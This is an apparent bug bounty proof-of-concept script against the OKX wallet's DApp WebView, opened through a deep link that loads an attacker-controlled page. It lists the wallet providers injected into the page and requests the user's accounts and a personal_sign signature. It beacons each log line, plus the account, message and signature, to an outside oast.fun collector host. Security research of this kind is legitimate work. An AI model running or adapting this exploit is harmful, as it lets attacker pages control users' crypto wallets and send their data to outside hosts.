<script>
// ------------- collector -------------
// Change this to your own logging endpoint. Beacons run regardless of WebView lifecycle.
const COLLECT = 'https://xdhrflssxhuownkbsbgks7myap3kv1oo6.oast.fun/collect';

const logEl = document.getElementById('log');
function log(line, cls){
  const t = new Date().toISOString().slice(11,23);
  const span = document.createElement('span');
  if(cls) span.className = cls;
  span.textContent = `[${t}] ${line}\n`;
  logEl.appendChild(span);
  // exfil so PoC evidence survives WebView closure
  try { navigator.sendBeacon(COLLECT + '?ev=' + encodeURIComponent(line)); } catch(e){}
}

// ------------- 1. Provider enumeration -------------
const EVM_PROVIDERS = ['ethereum','okxwallet','okexchain','web3','coinbaseWalletExtension'];
const NON_EVM       = ['solana','okxSolana','aptos','okxAptos','sui','okxSui',
                       'bitcoin','okxBitcoin','tronWeb','okxTron','starknet','okxStarknet',
                       'cosmos','okxCosmos','ton','okxTon'];
const ALL = [...EVM_PROVIDERS, ...NON_EVM];

document.getElementById('probe').onclick = () => {
  log('[+] origin = ' + location.origin);
  log('[+] UA     = ' + navigator.userAgent);
  let found = 0;
  ALL.forEach(name => {
    if (window[name]) {
      found++;
      let methods = '';
      try { methods = Object.keys(window[name]).slice(0,12).join(','); } catch(e){}
      log(`[!] PROVIDER INJECTED: window.${name}  methods=${methods}`, 'crit');
    }
  });
  if (window.webkit?.messageHandlers) {
    log('[!] iOS WKWebView handlers: ' + Object.keys(window.webkit.messageHandlers).join(','), 'crit');
  }
  if (!found) log('[-] no EIP-1193 / wallet providers detected on window', 'warn');
};

// ------------- 2. Connect (eth_requestAccounts) -------------
let accounts = [];
document.getElementById('connect').onclick = async () => {
  const p = window.ethereum || window.okxwallet;
  if (!p) return log('[-] no EVM provider', 'err');
  try {
    accounts = await p.request({ method: 'eth_requestAccounts' });
    const chainId = await p.request({ method: 'eth_chainId' });
    log('[+] accounts = ' + JSON.stringify(accounts), 'ok');
    log('[+] chainId  = ' + chainId, 'ok');
  } catch(e){ log('[err] ' + e.message, 'err'); }
};

// ------------- 3. personal_sign (BENIGN MARKER — proof of remote signing) -------------
document.getElementById('sign').onclick = async () => {
  const p = window.ethereum || window.okxwallet;
  if (!p || !accounts.length) return log('[-] connect first', 'err');

  // The signed message is the irrefutable PoC artifact: it includes a fresh
  // timestamp and the attacker origin, so it cannot have been signed earlier
  // by the user themselves on a legitimate page.
  const marker =
`OKX Bug Bounty PoC — DApp WebView Injection
Researcher: <YOUR HANDLE>
Origin: ${location.origin}
Timestamp: ${new Date().toISOString()}
Random: ${crypto.randomUUID()}
Account: ${accounts[0]}

This message was requested by an attacker-controlled page loaded via
"okx://wallet/dapp/details?dappUrl=<attacker URL>" through DappDeepLinkTools.lua
→ OKDAppBridge:openDAppBrowserWithDic. A signature here proves remote
wallet-control. NOT a transaction — funds are not moved.`;

  try {
    const sig = await p.request({ method: 'personal_sign', params: [marker, accounts[0]] });
    log('[!!] PoC SIGNATURE RECEIVED', 'crit');
    log('[!!] message = ' + marker.replace(/\n/g,'\\n'), 'crit');
    log('[!!] signature = ' + sig, 'crit');
    // POST so OKX can verify offline using ecrecover
    fetch(COLLECT + '/sig', {method:'POST', headers:{'content-type':'application/json'},
      body: JSON.stringify({account: accounts[0], message: marker, signature: sig})});
  } catch(e){ log('[err] ' + e.message, 'err'); }
};
